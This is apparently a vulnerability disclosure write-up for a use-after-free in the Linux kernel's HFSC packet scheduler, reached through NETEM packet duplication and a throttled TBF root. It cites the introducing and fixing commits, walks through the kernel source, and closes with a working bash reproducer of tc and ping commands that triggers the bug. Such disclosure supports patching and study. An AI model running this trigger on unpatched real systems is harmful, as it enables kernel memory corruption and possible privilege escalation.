# Vulnerability details

- **Requirements**:
    - **Capabilities**: `CAP_NET_ADMIN`
    - **Kernel configuration**: `CONFIG_NET_SCH_HFSC`, `CONFIG_NET_SCH_NETEM`
    - **User namespaces required**: Yes
- **Introduced by**: https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=37d9cf1a3ce35de3df6f7d209bfb1f50cf188cea
- **Fixed by**: https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=ac9fe7dd8e730a103ae4481147395cc73492d786
- **Affected Version**: `5.4 - 6.15-rc7`
- **Affected Component**: `net/sched: sch_hfsc`
- **Syscall to disable**: `unshare`
- **Cause**: Use-After-Free
- **Description**: When HFSC is utilized with NETEM and the NETEM packet duplication
    feature is enabled, using HFSC_RSC it is possible to bypass the existing
    checks and insert the same HFSC class twice into the eligible tree.
    Under normal conditions, this would lead to an infinite loop in hfsc_dequeue()
    due to a cycle in the RBTree. However, if TBF is added as root qdisc and
    configured with a very low rate, it is possible to prevent packets from being dequeued.
    This behavior can be exploited to bypass the infinite loop and perform subsequent
    insertions in the HFSC eltree after the class has been freed, leading to a Use-After-Free.

# Vulnerability analysis

Let's consider the following network traffic control configuration:

```bash
# HFSC qdisc (1:0) --> HFSC class (1:1) --> NETEM qdisc (2:0)

tc qdisc add dev lo root handle 1:0 hfsc
tc class add dev lo parent 1:0 classid 1:1 hfsc rt m2 20Kbit
tc qdisc add dev lo parent 1:1 handle 2:0 netem duplicate 100%
tc filter add dev lo parent 1:0 protocol ip prio 1 u32 match ip dst 127.0.0.1 flowid 1:1

# ping -I lo -f -c1 -s48 -W0.001 127.0.0.1
```

When a packet is sent to the network interface, `hfsc_enqueue()` is called:

```c
static int
hfsc_enqueue(struct sk_buff *skb, struct Qdisc *sch, struct sk_buff **to_free)
{
	unsigned int len = qdisc_pkt_len(skb);
	struct hfsc_class *cl;
	int err;
	bool first;

	cl = hfsc_classify(skb, sch, &err); // [1]
	if (cl == NULL) {
		if (err & __NET_XMIT_BYPASS)
			qdisc_qstats_drop(sch);
		__qdisc_drop(skb, to_free);
		return err;
	}

	first = !cl->qdisc->q.qlen; // [2]
	err = qdisc_enqueue(skb, cl->qdisc, to_free); // [3]
	if (unlikely(err != NET_XMIT_SUCCESS)) {
		if (net_xmit_drop_count(err)) {
			cl->qstats.drops++;
			qdisc_qstats_drop(sch);
		}
		return err;
	}

	if (first && !cl->cl_nactive) { // [4]
		if (cl->cl_flags & HFSC_RSC)
			init_ed(cl, len); // [5]
		if (cl->cl_flags & HFSC_FSC)
			init_vf(cl, len);

		if (cl->cl_flags & HFSC_RSC)
			cl->qdisc->ops->peek(cl->qdisc);

	}

	sch->qstats.backlog += len;
	sch->q.qlen++;

	return NET_XMIT_SUCCESS;
}
```

In this function, `hfsc_classify()` returns class 1:1 `[1]`.  Since `qlen` is still zero, `first` is set to `true` `[2]`. 
Next, `qdisc_enqueue()` is called, which internally calls the child qdisc's `enqueue()` handler. `[3]`

At this point, since `first` is `true` and `cl->cl_nactive` is zero, the `(first && !cl->cl_nactive)` check at `[4]` passes, and `init_ed()` inserts the class into the HFSC eligible tree `[5]`. However, this check is incomplete, as `cl->cl_nactive` [is only incremented by init_vf()](https://elixir.bootlin.com/linux/v6.6.90/source/net/sched/sch_hfsc.c#L677), and `init_ed()` never updates it.

This becomes problematic when the child qdisc is NETEM and the NETEM packet duplication feature is enabled, because the class can be inserted twice into the tree due to the reentrant enqueue:

```c
static int netem_enqueue(struct sk_buff *skb, struct Qdisc *sch,
			 struct sk_buff **to_free)
{
	struct netem_sched_data *q = qdisc_priv(sch);
	struct netem_skb_cb *cb;
	struct sk_buff *skb2 = NULL;
	struct sk_buff *segs = NULL;
	unsigned int prev_len = qdisc_pkt_len(skb);
	int count = 1;

	skb->prev = NULL;

	if (q->duplicate && q->duplicate >= get_crandom(&q->dup_cor, &q->prng))
		++count;

        // ...

	if (count > 1)
		skb2 = skb_clone(skb, GFP_ATOMIC); // [1]

        // ...

	if (skb2) {
		struct Qdisc *rootq = qdisc_root_bh(sch);
		u32 dupsave = q->duplicate; /* prevent duplicating a dup... */

		q->duplicate = 0;
		rootq->enqueue(skb2, rootq, to_free); // hfsc_enqueue() is called again [2]
		q->duplicate = dupsave;
		skb2 = NULL;
	}

        // ...
}
```

In `netem_enqueue()`, when packet duplication is enabled, the skb is cloned, `[1]` and the root qdisc's enqueue handler called again. `[2]` This leads to the following chain of events:

```c
hfsc_enqueue()
    cl = hfsc_classify() // Class 1:1
    first = !cl->qdisc->q.qlen // true
    qdisc_enqueue()
        netem_enqueue()
            // Packet duplication is enabled
            skb2 = skb_clone(skb)
            // The duplicate is enqueued in the root qdisc (rootq->enqueue(skb2, ...))
            hfsc_enqueue()
                cl = hfsc_classify() // Class 1:1
                first = !cl->qdisc->q.qlen // true
                qdisc_enqueue()
                    netem_enqueue()
                        // Already a duplicate
                // `first` is true, `cl->cl_natcive` is 0, so the class is inserted in the eltree
                init_ed(cl, len); // The class is inserted in the eltree
                sch->q.qlen++
            // ...
    // `first` is true, `cl->cl_natcive` is 0, so the class is inserted in the eltree
    init_ed(cl, len); // BUG! Class inserted twice!
    sch->q.qlen++
```

After the double class insertion, `hfsc_dequeue()` is automatically called:

```c
static struct sk_buff *
hfsc_dequeue(struct Qdisc *sch)
{
	struct hfsc_sched *q = qdisc_priv(sch);
	struct hfsc_class *cl;
	struct sk_buff *skb;
	u64 cur_time;
	unsigned int next_len;
	int realtime = 0;

	if (sch->q.qlen == 0)
		return NULL;

	cur_time = psched_get_time();
	cl = eltree_get_mindl(q, cur_time); // [1]

        // ...
}
``` 

In `hfsc_dequeue()`, `eltree_get_mindl()` is called to find the class with the minimum deadline among the eligible classes. `[1]` This is where the infinite loop occurs:

```c
static inline struct hfsc_class *
eltree_get_mindl(struct hfsc_sched *q, u64 cur_time)
{
	struct hfsc_class *p, *cl = NULL;
	struct rb_node *n;

	for (n = rb_first(&q->eligible); n != NULL; n = rb_next(n)) { // Infinite loop
		p = rb_entry(n, struct hfsc_class, el_node);
		if (p->cl_e > cur_time)
			break;
		if (cl == NULL || p->cl_d < cl->cl_d)
			cl = p;
	}
	return cl;
}
```

Due to a cycle in the RBTree caused by the double class insertion, the class is now both its parent and its left child:

```c
gefâž¤  p *(struct rb_node *)0xffff88810a6d0ca0 // class->el_node
$2 = {
  __rb_parent_color = 0xffff88810a6d0ca0, // ***
  rb_right = 0x0 <fixed_percpu_data>,
  rb_left = 0xffff88810a6d0ca0 // ***
}
```

In `eltree_get_mindl()`, `rb_first()` traverses the tree by following the `rb_left` child pointers until NULL is encountered. But in our case, `rb_left` point to the `el_node` itself, so the while loop never ends:

```c
struct rb_node *rb_first(const struct rb_root *root)
{
	struct rb_node	*n;

	n = root->rb_node;
	if (!n)
		return NULL;
	while (n->rb_left)
		n = n->rb_left;
	return n;
}
```

However, if TBF is added as root qdisc and configured with a very low rate, it is possible to prevent packets from being dequeued:

```c
static struct sk_buff *tbf_dequeue(struct Qdisc *sch)
{
	struct tbf_sched_data *q = qdisc_priv(sch);
	struct sk_buff *skb;

	skb = q->qdisc->ops->peek(q->qdisc);

	if (skb) {
		s64 now;
		s64 toks;
		s64 ptoks = 0;
		unsigned int len = qdisc_pkt_len(skb);

		now = ktime_get_ns();
		toks = min_t(s64, now - q->t_c, q->buffer);

                // ..

		toks -= (s64) psched_l2t_ns(&q->rate, len);

		if ((toks|ptoks) >= 0) { // [1]
			skb = qdisc_dequeue_peeked(q->qdisc);
			if (unlikely(!skb))
				return NULL;

			q->t_c = now;
			q->tokens = toks;
			q->ptokens = ptoks;
			qdisc_qstats_backlog_dec(sch, skb);
			sch->q.qlen--;
			qdisc_bstats_update(sch, skb);
			return skb;
		}

		qdisc_watchdog_schedule_ns(&q->watchdog,
					   now + max_t(long, -toks, -ptoks)); // [2]

		qdisc_qstats_overlimit(sch);
	}
	return NULL;
}
```

In `tbf_dequeue()`, if the number of remaining tokens is less than zero, `[1]` the qdisc will reschedule itself for later, `[2]` and from this moment on the interface will be unable to dequeue packets. The number of tokens in TBF is user-controllable and can be minimized in [tbf_change()](https://elixir.bootlin.com/linux/v6.6.90/source/net/sched/sch_tbf.c#L356).

This is particulary useful in the double class insertion case, because if the network interface is unable to dequeue packets, the infinite loop can be avoided, the class can be freed (remaining accessible in the RBTree due to the double insertion), and a Use-After-Free can be triggered when a new class is inserted into the tree.

Here is a reproducer to trigger a UAF when the kernel is compiled with KASAN:

```bash
#!/bin/bash

#   
#   TBF qdisc (1:0) --> HFSC qdisc (2:0) --> HFSC class (2:1) --> NETEM qdisc (3:0)
#                                        `-> HFSC class (2:2)
#

# Prevent packets from being dequeued
tc qdisc add dev lo root handle 1: tbf rate 8bit burst 100b latency 1s
tc qdisc add dev lo parent 1:0 handle 2:0 hfsc
ping -I lo -f -c10 -s48 -W0.001 127.0.0.1

# Setup the vulnerable configuration
tc class add dev lo parent 2:0 classid 2:1 hfsc rt m2 20Kbit
tc qdisc add dev lo parent 2:1 handle 3:0 netem duplicate 100%
tc class add dev lo parent 2:0 classid 2:2 hfsc rt m2 20Kbit

tc filter add dev lo parent 2:0 protocol ip prio 1 u32 match ip dst 127.0.0.1 flowid 2:1
tc filter add dev lo parent 2:0 protocol ip prio 2 u32 match ip dst 127.0.0.2 flowid 2:2

# Class 2:1 is inserted twice into the eligible tree
ping -I lo -f -c1 -s48 -W0.001 127.0.0.1

# Class 2:1 is freed (but still accessible in the tree)
tc filter del dev lo parent 2:0 protocol ip prio 1
tc class del dev lo classid 2:1

# Trigger a UAF by adding class 2:2 to the tree
ping -I lo -f -c1 -s48 -W0.001 127.0.0.2
```
